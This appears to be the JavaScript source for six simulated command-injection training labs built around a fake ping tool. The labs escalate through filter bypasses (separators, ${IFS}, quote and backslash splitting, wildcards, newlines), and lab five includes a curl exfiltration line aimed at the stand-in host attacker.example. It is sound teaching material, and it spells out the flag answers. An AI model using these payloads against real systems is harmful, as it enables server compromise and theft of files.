/* ============================================================
   HackRange labs · Command Injection (6 labs)
   A simulated ping utility running shell commands. Filters
   escalate from nothing to a full gauntlet, teaching separator
   alternatives, string obfuscation and out of band exfil.
   ============================================================ */

function pingOut(host, n) {
  const h = (host || 'target').slice(0, 40);
  const ip = '93.184.216.34';
  return [
    'PING ' + h + ' (' + ip + ') 56(84) bytes of data.',
    '64 bytes from ' + h + ' (' + ip + '): icmp_seq=1 ttl=56 time=11.4 ms',
    '64 bytes from ' + h + ' (' + ip + '): icmp_seq=2 ttl=56 time=10.9 ms',
    '',
    '--- ' + h + ' ping statistics ---',
    '2 packets transmitted, 2 received, 0% packet loss, time 1001ms'
  ];
}

/* strip the tricks a shell plays on strings, mirroring what the
   shell itself would deliver to execve */
function deobfuscate(v) {
  return v
    .replace(/\$\{IFS\}/g, ' ')
    .replace(/\$IFS/g, ' ')
    .replace(/\\(.)/g, '$1')
    .replace(/""/g, '')
    .replace(/''/g, '')
    .replace(/\$@/g, '');
}

function globToRegex(g) {
  let out = '';
  for (const ch of g) {
    if (ch === '?') out += '[^/]';
    else if (ch === '*') out += '[^/]*';
    else out += ch.replace(/[.+^${}()|[\]\\]/g, '\\$&');
  }
  return new RegExp('^' + out + '$');
}

const FLAG_PATH = '/var/www/flag.txt';

function cmdResult(v, opts) {
  opts = opts || {};
  const q = deobfuscate(v);
  /* direct or obfuscated read of the flag file */
  const catM = q.match(new RegExp('(cat|tail|head|more|less|nl|tac|od|xxd)\\s+' + FLAG_PATH.replace(/[./]/g, '\\$&'), 'i'));
  const globM = q.match(/(cat|tail|head|more|less|nl|tac|od|xxd)\s+((?:[?*]?[^?\s]*)+)/i);
  const idM = q.match(/(^|[;&|\n]\s*)id\s*$/m);
  const whoM = q.match(/(^|[;&|\n]\s*)whoami\s*$/m);
  if (catM || (globM && globToRegex(globM[2].trim()).test(FLAG_PATH))) {
    return { out: pingOut(v.split(/\s/)[0]).concat([
      'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      '',
      '',
      ''
    ]), flagRead: true };
  }
  if (idM) return { out: pingOut(v.split(/\s/)[0]).concat(['', 'uid=33(www-data) gid=33(www-data) groups=33(www-data)']) };
  if (whoM) return { out: pingOut(v.split(/\s/)[0]).concat(['', 'www-data']) };
  const anyCmd = v.match(/[;&|`\n]\s*(\$?\(?([a-z_.\/-]+))/i);
  if (anyCmd) {
    return { out: pingOut(v.split(/\s/)[0]).concat(['', 'bash: ' + anyCmd[2] + ': command not found or no output in this sim']) };
  }
  return { out: pingOut(v.split(/\s/)[0].replace(/[;&|`]/g, '')) };
}

HR.defineLab({
  id: 'cmdi-01', cat: 'cmdi', diff: 1,
  title: 'The Semicolon Door',
  brief: 'The club infrastructure panel has a "ping a host" utility. You suspect the developers passed your input straight into a shell command. There is a flag file on the box at /var/www/flag.txt. Read it through the ping tool without ever leaving your browser.',
  env: {
    type: 'cmdi',
    app: 'Infra Ping Tool',
    shellCmd: 'ping -c 2 <your input>',
    placeholder: 'host to ping, e.g. 8.8.8.8',
    run: function (v) {
      const r = cmdResult(v);
      if (r.flagRead) {
        r.out[r.out.length - 2] = 'HR{semicolon_door}';
        return { out: r.out, solved: true };
      }
      return r;
    }
  },
  flag: 'HR{semicolon_door}',
  flagNote: 'The environment reveals the flag when you read the flag file.',
  hints: [
    'The app runs: ping -c 2 YOURINPUT in a shell. A shell takes ; as "end this command, start a new one".',
    'After the semicolon you can run ANY command the web server user can run. You want to read a file.',
    ';cat /var/www/flag.txt appended to any host does it.'
  ],
  walk: 'The backend runs something like <span class="mono">system("ping -c 2 " + input)</span>. The semicolon terminates the ping and starts your command: <span class="mono">8.8.8.8;cat /var/www/flag.txt</span>. The output contains both the ping and the file: the flag <span class="mono">HR{semicolon_door}</span>. Also try <span class="mono">;id</span> to see the app runs as www-data. Command injection is one of the most reliably paid bug classes because it means full server compromise: the impact section of your report writes itself. Detection first: inject a semicolon plus something harmless like <span class="mono">id</span> and look for its output.',
  study: 'SecLab · Payload Lab · command injection context card and separator table.'
});

HR.defineLab({
  id: 'cmdi-02', cat: 'cmdi', diff: 2,
  title: 'Pipe Dreams',
  brief: 'The infra team saw your semicolon demo and blocked it, along with the double ampersand. Their rule: "no ; and no &&, problem solved". The shell has more separators than a sentence has punctuation. Find another door.',
  env: {
    type: 'cmdi',
    app: 'Infra Ping Tool v2',
    shellCmd: 'ping -c 2 <your input>',
    placeholder: 'host to ping',
    waf: [
      { re: /;/, msg: '403 Forbidden: the character ; is not allowed.' },
      { re: /&&/, msg: '403 Forbidden: the sequence && is not allowed.' }
    ],
    run: function (v) {
      const r = cmdResult(v);
      if (r.flagRead) {
        r.out[r.out.length - 2] = 'HR{pipe_dreams}';
        return { out: r.out, solved: true };
      }
      return r;
    }
  },
  flag: 'HR{pipe_dreams}',
  flagNote: 'The environment reveals the flag when you read the flag file.',
  hints: [
    'Blocked: ; and &&. Available: the pipe character, the single ampersand, backticks, and $( ) substitution.',
    'A pipe feeds the output of one command into another. As a separator it still runs your command.',
    '|cat /var/www/flag.txt reads the file. $(cat /var/www/flag.txt) and `cat /var/www/flag.txt` work too.'
  ],
  walk: 'The filter blocks <span class="mono">;</span> and <span class="mono">&amp;&amp;</span> only. The pipe separates commands as well: <span class="mono">8.8.8.8|cat /var/www/flag.txt</span>. Command substitution variants work too: <span class="mono">$(cat /var/www/flag.txt)</span> and backticks. The full separator family to memorize: <span class="mono">;</span> <span class="mono">&amp;&amp;</span> <span class="mono">||</span> <span class="mono">|</span> <span class="mono">&amp;</span> <span class="mono">\\n (newline)</span> <span class="mono">$( )</span> <span class="mono">` `</span>. A filter that blocks two of eight is a suggestion, not a control. The flag: <span class="mono">HR{pipe_dreams}</span>.',
  study: 'SecLab · Payload Lab · the eight separators card.'
});

HR.defineLab({
  id: 'cmdi-03', cat: 'cmdi', diff: 2,
  title: 'IFS Means Space',
  brief: 'Blocklist round three: no semicolons, no pipes, no spaces. The developer reasons: "commands need spaces, so no spaces, no commands". He forgot that the shell itself has a variable that CONTAINS a space, and variables expand before commands run.',
  env: {
    type: 'cmdi',
    app: 'Infra Ping Tool v3',
    shellCmd: 'ping -c 2 <your input>',
    placeholder: 'host to ping',
    waf: [
      { re: /;/, msg: '403 Forbidden: ; is not allowed.' },
      { re: /\|/, msg: '403 Forbidden: | is not allowed.' },
      { re: / /, msg: '403 Forbidden: spaces are not allowed.' }
    ],
    run: function (v) {
      const r = cmdResult(v);
      if (r.flagRead) {
        r.out[r.out.length - 2] = 'HR{ifs_replaces_space}';
        return { out: r.out, solved: true };
      }
      return r;
    }
  },
  flag: 'HR{ifs_replaces_space}',
  flagNote: 'The environment reveals the flag when you read the flag file.',
  hints: [
    'Separators still available: the single & (which runs the next command) and the newline.',
    'For the space inside your command, use ${IFS}: the shell variable whose default value is a space (Internal Field Separator).',
    '&cat${IFS}/var/www/flag.txt runs cat with a space you never typed.'
  ],
  walk: 'Two bypasses stack. Separator: a single <span class="mono">&amp;</span> (the waf watches for <span class="mono">;</span> and <span class="mono">|</span>), so <span class="mono">8.8.8.8&amp;cat...</span> backgrounds the ping and runs your command. Space: <span class="mono">${IFS}</span> expands to a space before execution, so <span class="mono">&amp;cat${IFS}/var/www/flag.txt</span> is <span class="mono">cat /var/www/flag.txt</span> to the shell while containing no literal space for the filter. The flag: <span class="mono">HR{ifs_replaces_space}</span>. The general principle beats any specific trick: THE FILTER SEES RAW TEXT, THE SHELL SEES EXPANSIONS. Every gap between those two views is an bypass.',
  study: 'SecLab · Payload Lab · ${IFS} and other expansion tricks.'
});

HR.defineLab({
  id: 'cmdi-04', cat: 'cmdi', diff: 2,
  title: 'Slice the String',
  brief: 'Round four. The team blocks every known reader command by name: cat, tail, head, more, less, nl, tac. Plus semicolons and pipes. But bash rebuilds strings from fragments before executing them. A blocked word made of two pieces is not a blocked word.',
  env: {
    type: 'cmdi',
    app: 'Infra Ping Tool v4',
    shellCmd: 'ping -c 2 <your input>',
    placeholder: 'host to ping',
    waf: [
      { re: /;|\|/, msg: '403 Forbidden: ; and | are not allowed.' },
      { re: /\b(cat|tail|head|more|less|nl|tac)\b/i, msg: '403 Forbidden: that file reader command is not allowed.' }
    ],
    run: function (v) {
      const r = cmdResult(v);
      if (r.flagRead) {
        r.out[r.out.length - 2] = 'HR{slice_the_string}';
        return { out: r.out, solved: true };
      }
      return r;
    }
  },
  flag: 'HR{slice_the_string}',
  flagNote: 'The environment reveals the flag when you read the flag file.',
  hints: [
    'The filter matches the literal word cat. Bash concatenates adjacent quoted fragments: ca""t is cat to the shell.',
    'A backslash between letters works too: c\\at, or even cat split as \c\at.',
    '&ca""t${IFS}/var/www/flag.txt or &c\\at${IFS}/var/www/flag.txt'
  ],
  walk: 'The filter sees <span class="mono">cat</span> as a forbidden word, but the shell reassembles fragments first: <span class="mono">ca""t</span>, <span class="mono">ca\'\'t</span> and <span class="mono">c\\at</span> all become <span class="mono">cat</span> at execution. So <span class="mono">8.8.8.8&amp;ca""t${IFS}/var/www/flag.txt</span> reads the file while containing none of the blocked strings. The flag: <span class="mono">HR{slice_the_string}</span>. This trick generalizes everywhere word filters exist: WAFs, EDR rules, DLP systems. A word match is only as strong as the canonical form of the word, and text has infinite non-canonical forms. The only real defense is allowlisting or invoking programs with an argument array instead of a shell string.',
  study: 'SecLab · Payload Lab · string obfuscation family cards.'
});

HR.defineLab({
  id: 'cmdi-05', cat: 'cmdi', diff: 3,
  title: 'Ghost Output',
  brief: 'Final defense in depth: separators ; | & all blocked, AND the app no longer shows ping output. "No output, no data exfiltration" says the architect. He is thinking about the response. He forgot the server can talk to machines YOU control. If you can make it send the flag outbound, you do not need the response. Your listener catches what the response hides. (No real network is used here: the lab simulates your listener.)',
  env: {
    type: 'cmdi',
    app: 'Infra Ping Tool v5',
    shellCmd: 'ping -c 2 <your input>',
    placeholder: 'host to ping (multi-line input allowed)',
    multiline: true,
    waf: [
      { re: /;/, msg: '403 Forbidden: ; is not allowed.' },
      { re: /\|/, msg: '403 Forbidden: | is not allowed.' },
      { re: /&/, msg: '403 Forbidden: & is not allowed.' }
    ],
    run: function (v) {
      const q = deobfuscate(v);
      const exfil = /(curl|wget|nslookup|dig)/i.test(q) && /flag\.txt|cat/i.test(q);
      if (exfil) {
        return {
          out: [
            'ping completed (output suppressed)',
            '',
            '--- [simulated] your HTTP listener on attacker.example ---',
            'GET /?d=HR{out_of_band_win} HTTP/1.1',
            'Host: attacker.example',
            'User-Agent: curl/7.81.0'
          ],
          solved: true,
          note: 'The application response showed nothing, but your out of band listener received the flag.'
        };
      }
      const hasNewline = /\n/.test(v);
      return {
        out: ['ping completed (output suppressed)'],
        note: hasNewline
          ? 'Your second line executed, but its output never reaches the response. Where else could output go?'
          : 'Your input ran. Output is suppressed. Think out of band.'
      };
    }
  },
  flag: 'HR{out_of_band_win}',
  flagNote: 'The environment reveals the flag when your callback lands.',
  hints: [
    'Separators all blocked? Press Enter: a NEWLINE separates commands too, and textarea input carries it. On a real web form, %0a is the URL encoded newline.',
    'You cannot see output, but the server can make requests: curl, wget, nslookup, dig. Send the flag to a host you control.',
    'curl attacker.example/?d=$(cat /var/www/flag.txt) on the second line. The $() substitution is still allowed.'
  ],
  walk: 'Two stacked ideas. First, the newline: <span class="mono">;</span> <span class="mono">|</span> <span class="mono">&amp;</span> are blocked but Enter is not. In a URL parameter <span class="mono">%0a</span> carries a newline into the same shell. Second, out of band exfiltration: instead of reading the flag in the response, make the server deliver it to you: <span class="mono">curl http://attacker.example/?d=$(cat /var/www/flag.txt)</span>. Your listener logs the GET and the flag arrives without any application output. This is OAST / out of band technique, the same idea behind Burp Collaborator: when a channel is blind, create a new channel. In this lab the listener is simulated, so no real traffic leaves your browser. The flag: <span class="mono">HR{out_of_band_win}</span>.',
  study: 'SecLab · Payload Lab · blind command injection and OAST notes.'
});

HR.defineLab({
  id: 'cmdi-06', cat: 'cmdi', diff: 4,
  title: 'The Full Gauntlet',
  brief: 'The consultant special. Blocked: semicolons, pipes, ampersands, backticks, $(), spaces, the word cat, and the word flag. The architect calls it "input sanitation complete". You have exactly three bypasses left, and you already know all of them. Stack them into one payload and take the flag.',
  env: {
    type: 'cmdi',
    app: 'Infra Ping Tool PRO',
    shellCmd: 'ping -c 2 <your input>',
    placeholder: 'host to ping (multi-line input allowed)',
    multiline: true,
    waf: [
      { re: /;|\||&|`|\$\(/, msg: '403 Forbidden: command separators are not allowed.' },
      { re: / /, msg: '403 Forbidden: spaces are not allowed.' },
      { re: /cat/i, msg: '403 Forbidden: the string "cat" is not allowed.' },
      { re: /flag/i, msg: '403 Forbidden: the string "flag" is not allowed.' }
    ],
    run: function (v) {
      const q = deobfuscate(v);
      const catM = q.match(/(cat|tail|head|nl|tac)\s+([^\s]+)/i);
      if (catM) {
        const pathOk = catM[2] === FLAG_PATH || globToRegex(catM[2]).test(FLAG_PATH);
        if (pathOk) {
          return {
            out: pingOut(v.split('\n')[0].split(/\s/)[0]).concat([
              'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
              '',
              'HR{newline_separator}',
              ''
            ]),
            solved: true
          };
        }
      }
      return { out: pingOut(v.split('\n')[0].split(/\s/)[0]) };
    }
  },
  flag: 'HR{newline_separator}',
  flagNote: 'The environment reveals the flag when you read the flag file.',
  hints: [
    'Inventory what survives: newlines, ${IFS}, backslashes inside words, and ? * wildcards in paths. Three techniques, three blocked things to defeat: separator, space, forbidden strings.',
    'Separator: newline. Space: ${IFS}. The word cat: c\\at. Now the path: the word flag is blocked, so spell the filename with wildcards.',
    'Two lines: first line any host, second line: c\\at${IFS}/???/www/fl?g.t?t'
  ],
  walk: 'Stack all three bypasses: newline as separator (multi-line input or %0a in a URL), <span class="mono">${IFS}</span> as space, <span class="mono">c\\at</span> as the blocked word, and wildcards for the blocked filename: <span class="mono">/???/www/fl?g.t?t</span> matches <span class="mono">/var/www/flag.txt</span>. Full payload, second line: <span class="mono">c\\at${IFS}/???/www/fl?g.t?t</span>. The shell expands everything before executing, so the filter never sees a single forbidden token. The flag: <span class="mono">HR{newline_separator}</span>. You now own the complete command injection toolkit: separators, expansions, obfuscation, wildcards, and out of band channels. Every future filter you meet is just a new combination of these same ideas.',
  study: 'SecLab · Payload Lab · full adaptation playbook, run it end to end.'
});
